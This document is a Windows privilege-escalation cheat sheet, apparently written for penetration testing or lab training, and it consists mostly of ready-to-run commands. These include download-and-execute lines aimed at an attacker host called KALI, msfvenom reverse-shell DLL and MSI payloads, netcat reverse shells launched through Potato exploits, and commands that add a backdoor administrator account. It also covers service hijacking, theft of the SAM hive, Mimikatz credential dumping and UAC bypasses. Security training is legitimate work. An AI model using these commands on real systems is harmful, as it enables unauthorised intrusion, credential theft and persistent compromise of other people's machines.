---
title: "Windows Privilege Escalation"
---

# Windows Privilege Escalation

Windows privilege escalation is the process of moving from a low-privilege user context to SYSTEM or Administrator. It's methodical: automated enumeration first to identify candidates, then manual verification and exploitation.

## Initial Enumeration

The first commands after landing a shell:

```shell
whoami
whoami /priv
whoami /groups
net user <username>
net localgroup administrators
systeminfo
hostname
```

```powershell
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
[System.Environment]::OSVersion
```

## Automated Enumeration Tools

### WinPEAS

The most comprehensive Windows privilege escalation enumeration tool:

```shell
# Download and run (requires internet or pre-stage)
certutil -urlcache -f http://KALI/winpeas.exe C:\Windows\Temp\winpeas.exe
C:\Windows\Temp\winpeas.exe

# PowerShell
Invoke-WebRequest -Uri http://KALI/winpeas.exe -OutFile C:\Windows\Temp\winpeas.exe
.\winpeas.exe

# Run all checks
winpeas.exe all

# Specific checks
winpeas.exe systeminfo
winpeas.exe userinfo
winpeas.exe servicesinfo
winpeas.exe applicationsinfo
```

### PowerUp

```powershell
# Import and run
IEX (New-Object Net.WebClient).DownloadString('http://KALI/PowerUp.ps1')
Invoke-AllChecks

# Or copy locally
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

### Seatbelt

```shell
Seatbelt.exe all
Seatbelt.exe -group=system
Seatbelt.exe -group=user
Seatbelt.exe DotNet Osinfo PowerShell
```

## Service Exploitation

### Unquoted Service Path

If a service binary path contains spaces and is unquoted, Windows looks for the executable in each path segment:

```shell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows" | findstr /i /v """

# PowerShell
Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '"*"' -and $_.PathName -like '* *'}
```

Exploitation:

```
# Service path: C:\Program Files\My App\service.exe
# Windows looks for:
# C:\Program.exe
# C:\Program Files\My.exe    ← place payload here if writable
# C:\Program Files\My App\service.exe

icacls "C:\Program Files\My App\"  # Check write permissions
copy shell.exe "C:\Program Files\My.exe"
sc stop vulnsvc
sc start vulnsvc
```

### Insecure Service Permissions

```shell
# Check service DACL
accesschk.exe -ucqv <service_name> -accepteula
sc sdshow <service_name>

# Modify service binary path
sc config <service_name> binPath= "cmd.exe /c net localgroup administrators <user> /add"
sc stop <service_name>
sc start <service_name>

# Or point to reverse shell
sc config <service_name> binPath= "C:\Windows\Temp\shell.exe"
```

### Insecure Service Binary Permissions

```shell
# Check if we can replace the service binary
icacls "C:\path\to\service.exe"

# Replace with payload
copy /Y shell.exe "C:\path\to\service.exe"
sc stop <service_name>
sc start <service_name>
```

### DLL Hijacking

If a service or application loads a DLL that doesn't exist, you can place your own:

```shell
# Use Process Monitor (Procmon) to find missing DLLs
# Filter: Process Name is service.exe, Result is NAME NOT FOUND, Path ends with .dll

# Check writable directories in the search path
echo %PATH%

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f dll -o missing.dll
copy missing.dll "C:\writable\path\missing.dll"
```

## Registry Exploitation

### AlwaysInstallElevated

If both HKCU and HKLM AlwaysInstallElevated are 1, any user can install MSI packages as SYSTEM:

```shell
# Check registry values
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# If both return 0x1:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI LPORT=4444 -f msi -o shell.msi
msiexec /quiet /qn /i shell.msi
```

### Autorun Registry Keys

```shell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

# Check permissions on referenced executables
icacls "<path_from_registry>"
```

### Registry Stored Credentials

```shell
# Autologon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# PuTTY
reg query HKCU\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s

# VNC
reg query HKCU\Software\ORL\WinVNC3\Password
reg query HKLM\Software\RealVNC\WinVNC4 /v password

# SNMP
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
```

## Token Impersonation

### SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege

These privileges allow a user to impersonate another user's token: commonly present in service accounts:

```shell
whoami /priv
# Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
```

Exploit with Potato attacks:

```shell
# PrintSpoofer (Windows 10, Server 2019)
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "nc.exe KALI 4444 -e cmd"

# GodPotato (modern, works on most Windows versions)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net user hacker Password123 /add && net localgroup administrators hacker /add"

# RoguePotato
RoguePotato.exe -r KALI -e "nc.exe KALI 4444 -e cmd" -l 9999

# JuicyPotato (older systems, CLSID dependent)
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user hacker Password123 /add" -t *
```

### SeBackupPrivilege

Allows reading any file:

```shell
# Check privilege
whoami /priv

# Use diskshadow to copy SAM and SYSTEM
diskshadow /s script.dsh
robocopy /b C:\shadow\Windows\System32\config\ C:\temp\ SAM SYSTEM
# Then extract hashes offline with secretsdump
```

## Kernel Exploits

Check the OS and patch level:

```shell
systeminfo
# Look for: OS Version, Hotfix(es) installed

# Common kernel exploits
# MS16-032 (Windows 7-10, Server 2008-2012)
# MS15-051 (Windows 7/8, Server 2008)
# CVE-2020-0787 (Background Intelligent Transfer Service)
# CVE-2021-36934 (HiveNightmare/SeriousSAM: Windows 11 < 22000.65)
```

### HiveNightmare (CVE-2021-36934)

```shell
# Check if vulnerable
icacls C:\Windows\System32\config\SAM
# If BUILTIN\Users has read: vulnerable

# Exploit
vssadmin list shadows  # Check if shadow copy exists
# If yes:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\sam sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\system system
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\security security
```

## Password Hunting

```shell
# Search files for passwords
findstr /si "password" *.txt *.xml *.ini *.config 2>nul
findstr /si "password" C:\*.txt 2>nul

# PowerShell
Get-ChildItem -Recurse -Include *.txt,*.xml,*.ini,*.config | Select-String -Pattern "password" -CaseSensitive:$false

# Unattend files
dir /s /b C:\unattend.xml 2>nul
dir /s /b C:\sysprep.xml 2>nul
dir /s /b C:\Windows\Panther\Unattend.xml 2>nul

# IIS config
dir /s /b C:\inetpub\*.config 2>nul
type C:\inetpub\wwwroot\web.config
```

## Scheduled Tasks

```shell
schtasks /query /fo LIST /v
# Look for tasks running as SYSTEM with writable binary/script paths

# PowerShell
Get-ScheduledTask | Where-Object {$_.Principal.RunLevel -eq 'Highest'} | Select-Object TaskName,TaskPath

# Check binary permissions
icacls <binary_path>
```

## Credential Manager / DPAPI

```shell
# List stored credentials
cmdkey /list
vaultcmd /list

# Access with Mimikatz
privilege::debug
sekurlsa::logonpasswords    # Current session credentials
lsadump::sam                # SAM database
dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\<file>
```

## UAC Bypass

When running as a medium-integrity admin but need high integrity:

```powershell
# Fodhelper (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start cmd.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"

# EventViewer bypass
New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
Set-ItemProperty "HKCU:\Software\Classes\mscfile\Shell\Open\command" "(default)" "cmd /c start cmd.exe"
Start-Process "C:\Windows\System32\eventvwr.exe"
```
